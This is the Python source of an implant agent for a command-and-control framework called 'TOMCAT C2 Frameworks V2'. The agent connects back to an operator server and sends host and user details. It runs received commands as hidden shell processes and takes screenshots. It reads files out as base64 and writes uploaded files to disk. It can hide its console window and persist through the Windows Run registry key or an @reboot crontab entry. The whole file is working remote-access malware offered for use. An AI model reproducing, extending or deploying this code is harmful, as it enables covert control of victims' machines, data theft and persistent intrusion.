#!/usr/bin/python
# TOMCAT C2 Frameworks V2 - Enhanced with Debugging

import base64
import getpass
import json
import os
import platform
import socket
import subprocess
import sys
import threading
import signal
import time

if platform.system() == "Windows":
    try:
        import winreg
    except ImportError:
        winreg = None
else:
    winreg = None

XBanner = """
     _____ ___  __  __  ___   _ _____   ___  ___ _____ _  _ ___ _____ 
    |_   _/ _ \\|  \\/  |/ __| /_\\_   _| | _ )/ _ \\_   _| \\| | __|_   _|
      | || (_) | |\\/| | (__ / _ \\| |   | _ \\ (_) || | | .` | _|  | |  
      |_| \\___/|_|  |_|\\___/_/ \\_\\_|   |___/\\___/ |_| |_|\\_|___| |_|  
                                                                      
                    <   TOMCAT C2 Frameworks V2 Agent   />

"""


class TOMCATC2AGENT:
    def __init__(
        self,
        ServerHost,
        ServerPort,
        UseMTLS=False,
        HideConsole=False,
        AddPersistence=False,
        ShellMode="Standard",
    ):
        self.ServerHost = ServerHost
        self.ServerPort = ServerPort
        self.UseMTLS = UseMTLS
        self.HideConsole = HideConsole
        self.AddPersistence = AddPersistence
        self.ShellMode = ShellMode
        self.Socket = None
        self.Key = None
        self.Running = True

        self.CurrentProcess = None
        self.ProcessLock = threading.Lock()

    def HideConsoleWindow(self):
        if platform.system() == "Windows" and self.HideConsole:
            try:
                import ctypes

                whnd = ctypes.windll.kernel32.GetConsoleWindow()
                if whnd != 0:
                    ctypes.windll.user32.ShowWindow(whnd, 0)
                    print("[+] Console Hidden")
            except Exception:
                pass

    def SetupPersistence(self):
        if not self.AddPersistence:
            return

        try:
            if platform.system() == "Windows":
                self.WindowsPersistence()
            else:
                self.LinuxPersistence()
        except Exception as e:
            print(f"[-] Persistence Failed: {e}")

    def WindowsPersistence(self):
        try:
            import winreg

            ScriptPath = os.path.abspath(sys.argv[0])
            Key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                0,
                winreg.KEY_SET_VALUE,
            )
            winreg.SetValueEx(Key, "TOMCAT", 0, winreg.REG_SZ, f'python "{ScriptPath}"')
            winreg.CloseKey(Key)
            print("[+] Windows Persistence Added")
        except Exception as e:
            print(f"[-] Windows Persistence Error: {e}")

    def LinuxPersistence(self):
        try:
            ScriptPath = os.path.abspath(sys.argv[0])
            CronJob = f"@reboot python3 {ScriptPath}"

            Result = subprocess.run(
                f'(crontab -l 2>/dev/null; echo "{CronJob}") | crontab -',
                shell=True,
                capture_output=True,
            )

            if Result.returncode == 0:
                print("[+] Linux Persistence Added (Crontab)")
        except Exception as e:
            print(f"[-] Linux Persistence Error: {e}")

    def XorCryptography(self, Data, Key):
        DataBytes = Data if isinstance(Data, bytes) else Data.encode()
        KeyBytes = Key if isinstance(Key, bytes) else Key.encode()
        Result = bytearray()
        for i in range(len(DataBytes)):
            Result.append(DataBytes[i] ^ KeyBytes[i % len(KeyBytes)])
        return bytes(Result)

    def GetLocalIP(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            IP = s.getsockname()[0]
            s.close()
            return IP
        except Exception:
            return "Unknown"

    def ConnectToServer(self):
        try:
            print(f"[*] Connecting to {self.ServerHost}:{self.ServerPort}")

            if self.UseMTLS:
                import ssl

                context = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
                context.load_cert_chain(
                    certfile="agent-cert.pem", keyfile="agent-key.pem"
                )
                context.load_verify_locations("ca-cert.pem")
                context.check_hostname = False

                RawSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.Socket = context.wrap_socket(
                    RawSocket, server_hostname=self.ServerHost
                )
                self.Socket.connect((self.ServerHost, self.ServerPort))
                print("[+] mTLS Connection Established")
            else:
                self.Socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.Socket.connect((self.ServerHost, self.ServerPort))
                print("[+] Connected to Server")

            return True
        except Exception as e:
            print(f"[-] Connection Failed: {e}")
            return False

    def Handshake(self):
        try:
            print("[*] Starting handshake...")
            Key = self.Socket.recv(1024)
            if not Key:
                print("[-] No Key Received")
                return False
            self.Key = Key
            print(f"[+] Encryption Key Received ({len(Key)} bytes)")

            Info = {
                "OS": platform.system(),
                "Hostname": platform.node(),
                "User": getpass.getuser(),
                "Platform": platform.platform(),
                "Architecture": platform.machine(),
                "PythonVersion": platform.python_version(),
                "AgentIP": self.GetLocalIP(),
                "MTLSEnabled": self.UseMTLS,
                "ShellMode": self.ShellMode,
            }

            InfoJson = json.dumps(Info)
            print(f"[*] Sending system info: {InfoJson[:100]}...")
            self.Socket.send(InfoJson.encode())
            print(f"[+] System Info Sent")
            time.sleep(0.5)
            return True
        except Exception as e:
            print(f"[-] Handshake Failed: {e}")
            import traceback

            traceback.print_exc()
            return False

    def Encrypt(self, Data):
        try:
            from cryptography.fernet import Fernet

            Cipher = Fernet(self.Key)
            Encrypted = Cipher.encrypt(Data.encode() if isinstance(Data, str) else Data)
            print(f"[DEBUG] Encrypted {len(Data)} bytes -> {len(Encrypted)} bytes")
            return Encrypted
        except ImportError:
            print("[DEBUG] Using XOR encryption (fallback)")
            return self.XorCryptography(Data, self.Key)
        except Exception as e:
            print(f"[!] Encryption error: {e}")
            return self.XorCryptography(Data, self.Key)

    def Decrypt(self, Data):
        try:
            from cryptography.fernet import Fernet

            Cipher = Fernet(self.Key)
            Decrypted = Cipher.decrypt(Data).decode()
            print(f"[DEBUG] Decrypted {len(Data)} bytes -> {len(Decrypted)} chars")
            return Decrypted
        except ImportError:
            print("[DEBUG] Using XOR decryption (fallback)")
            return self.XorCryptography(Data, self.Key).decode()
        except Exception as e:
            print(f"[!] Decryption error: {e}")
            return self.XorCryptography(Data, self.Key).decode()

    def StopCurrentTask(self):
        with self.ProcessLock:
            if self.CurrentProcess and self.CurrentProcess.poll() is None:
                try:
                    print("[*] Stopping current task...")
                    if platform.system() == "Windows":
                        subprocess.run(
                            f"taskkill /F /T /PID {self.CurrentProcess.pid}",
                            shell=True,
                            capture_output=True,
                            timeout=5,
                        )
                    else:
                        try:
                            os.killpg(
                                os.getpgid(self.CurrentProcess.pid), signal.SIGTERM
                            )
                            time.sleep(0.3)
                            if self.CurrentProcess.poll() is None:
                                os.killpg(
                                    os.getpgid(self.CurrentProcess.pid), signal.SIGKILL
                                )
                        except ProcessLookupError:
                            pass

                    self.CurrentProcess = None
                    return "[+] Task stopped successfully"
                except Exception as e:
                    return f"[!] Failed to stop task: {str(e)}"
            else:
                return "[!] No task currently running"

    def ExecCommand(self, Command):
        try:
            print(f"[*] Executing command: {Command}")

            if Command.upper() == "STOPTASK":
                return self.StopCurrentTask()

            if Command == "SCREENSHOT":
                return self.TakeScreenshot()
            elif Command == "ELEVATE":
                return self.CheckPrivileges()
            elif Command.startswith("DOWNLOAD:"):
                Filepath = Command.split(":", 1)[1].strip()
                return self.ReadFiles(Filepath)
            elif Command.startswith("UPLOAD:"):
                Data = Command.split(":", 1)[1]
                return self.WriteFiles(Data)
            elif Command == "SYSINFO":
                return self.GetSystemInfo()
            elif Command.lower() in ["exit", "quit", "disconnect"]:
                self.Running = False
                return "Agent Disconnecting..."

            with self.ProcessLock:
                if platform.system() == "Windows":
                    Startupinfo = None
                    if hasattr(subprocess, "STARTUPINFO"):
                        Startupinfo = subprocess.STARTUPINFO()
                        Startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
                        Startupinfo.wShowWindow = 0

                    self.CurrentProcess = subprocess.Popen(
                        Command,
                        shell=True,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        text=True,
                        startupinfo=Startupinfo,
                    )
                else:
                    self.CurrentProcess = subprocess.Popen(
                        Command,
                        shell=True,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        text=True,
                        executable="/bin/bash",
                        preexec_fn=os.setsid,
                    )

            print("[*] Waiting for command output...")
            try:
                Stdout, Stderr = self.CurrentProcess.communicate(timeout=60)

                with self.ProcessLock:
                    self.CurrentProcess = None

                Output = Stdout + Stderr
                Result = (
                    Output
                    if Output.strip()
                    else "Command Executed Successfully (No Output)"
                )

                print(f"[+] Command completed")
                print(f"[DEBUG] Output length: {len(Result)} bytes")
                print(f"[DEBUG] Output preview: {Result[:200]}")

                return Result

            except subprocess.TimeoutExpired:
                print("[!] Command timeout, killing process...")
                with self.ProcessLock:
                    if self.CurrentProcess:
                        try:
                            if platform.system() == "Windows":
                                subprocess.run(
                                    f"taskkill /F /T /PID {self.CurrentProcess.pid}",
                                    shell=True,
                                    capture_output=True,
                                    timeout=5,
                                )
                            else:
                                try:
                                    os.killpg(
                                        os.getpgid(self.CurrentProcess.pid),
                                        signal.SIGKILL,
                                    )
                                except ProcessLookupError:
                                    pass
                        except Exception:
                            pass
                        self.CurrentProcess = None
                return "ERROR: Command Timeout (60s)"

        except Exception as e:
            with self.ProcessLock:
                self.CurrentProcess = None
            print(f"[!] Exception in ExecCommand: {e}")
            import traceback

            traceback.print_exc()
            return f"ERROR: {str(e)}"

    def TakeScreenshot(self):
        try:
            if platform.system() == "Windows":
                try:
                    from io import BytesIO
                    from PIL import ImageGrab

                    Screenshot = ImageGrab.grab()
                    Buffer = BytesIO()
                    Screenshot.save(Buffer, format="PNG")
                    ImgData = base64.b64encode(Buffer.getvalue()).decode()
                    return f"SCREENSHOT DATA:{ImgData}"
                except ImportError:
                    pass
            else:
                try:
                    import pyautogui

                    Screenshot = pyautogui.screenshot()
                    from io import BytesIO

                    Buffer = BytesIO()
                    Screenshot.save(Buffer, format="PNG")
                    ImgData = base64.b64encode(Buffer.getvalue()).decode()
                    return f"SCREENSHOT DATA:{ImgData}"
                except ImportError:
                    pass

            return "ERROR: Screenshot not supported"
        except Exception as e:
            return f"ERROR: Screenshot Failed - {str(e)}"

    def CheckPrivileges(self):
        try:
            if platform.system() == "Windows":
                import ctypes

                IsAdmin = ctypes.windll.shell32.IsUserAnAdmin() != 0
                return f"Administrator: {'YES' if IsAdmin else 'NO'}"
            else:
                IsRoot = os.geteuid() == 0
                return f"Root: {'YES' if IsRoot else 'NO'}"
        except Exception as e:
            return f"ERROR: {str(e)}"

    def ReadFiles(self, Filepath):
        try:
            with open(Filepath, "rb") as f:
                FileData = f.read()
            Encoded = base64.b64encode(FileData).decode()
            return f"FILE DATA:{Encoded}"
        except Exception as e:
            return f"ERROR: {str(e)}"

    def WriteFiles(self, Data):
        try:
            Parts = Data.split(":", 2)
            if len(Parts) < 3:
                return "ERROR: Invalid Upload Format"
            Filepath = Parts[1]
            FileData = base64.b64decode(Parts[2])
            with open(Filepath, "wb") as f:
                f.write(FileData)
            return f"[+] File Uploaded: {Filepath}"
        except Exception as e:
            return f"ERROR: {str(e)}"

    def GetSystemInfo(self):
        try:
            Info = {
                "OS": platform.system(),
                "OS Version": platform.version(),
                "Architecture": platform.machine(),
                "Processor": platform.processor(),
                "Hostname": platform.node(),
                "User": getpass.getuser(),
                "Python Version": platform.python_version(),
                "Local IP": self.GetLocalIP(),
            }

            InfoStr = "\n".join([f"{k}: {v}" for k, v in Info.items()])
            return InfoStr
        except Exception as e:
            return f"ERROR: {str(e)}"

    def MainLoop(self):
        print("[*] Entering main loop...")
        while self.Running:
            try:
                print("\n[*] Waiting for command...")
                self.Socket.settimeout(None)
                EncryptedCommand = self.Socket.recv(8192)

                if not EncryptedCommand:
                    print("[-] Connection Lost (empty recv)")
                    break

                print(f"[*] Received encrypted data: {len(EncryptedCommand)} bytes")

                Command = self.Decrypt(EncryptedCommand)
                print(f"[+] Decrypted command: {Command}")

                Output = self.ExecCommand(Command)
                print(f"[*] Command result: {len(Output)} bytes")

                OutputWithMarker = Output + "<END>"
                print(f"[*] Adding END marker, total: {len(OutputWithMarker)} bytes")

                EncryptedOutput = self.Encrypt(OutputWithMarker)
                print(f"[*] Encrypted output: {len(EncryptedOutput)} bytes")

                print("[*] Sending output...")
                self.Socket.sendall(EncryptedOutput)
                print("[+] Output sent successfully!")

            except socket.timeout:
                print("[!] Socket timeout")
                continue
            except Exception as e:
                print(f"[-] Error in MainLoop: {e}")
                import traceback

                traceback.print_exc()
                break

        print("[*] Agent Stopped")
        if self.Socket:
            self.Socket.close()

    def Run(self):
        print(XBanner)
        self.HideConsoleWindow()
        self.SetupPersistence()

        while True:
            if self.ConnectToServer():
                if self.Handshake():
                    self.MainLoop()

            if not self.Running:
                break

            print("[*] Reconnecting in 5 seconds...")
            time.sleep(5)


if __name__ == "__main__":
    ServerHost = "0.0.0.0"
    ServerPort = 4444
    USE_MTLS = False
    HIDE_CONSOLE = False
    ADD_PERSISTENCE = False

    Agent = TOMCATC2AGENT(
        ServerHost=ServerHost,
        ServerPort=ServerPort,
        UseMTLS=USE_MTLS,
        HideConsole=HIDE_CONSOLE,
        AddPersistence=ADD_PERSISTENCE,
        ShellMode="Standard",
    )

    try:
        Agent.Run()
    except KeyboardInterrupt:
        print("\n[!] Agent Stopped by User")
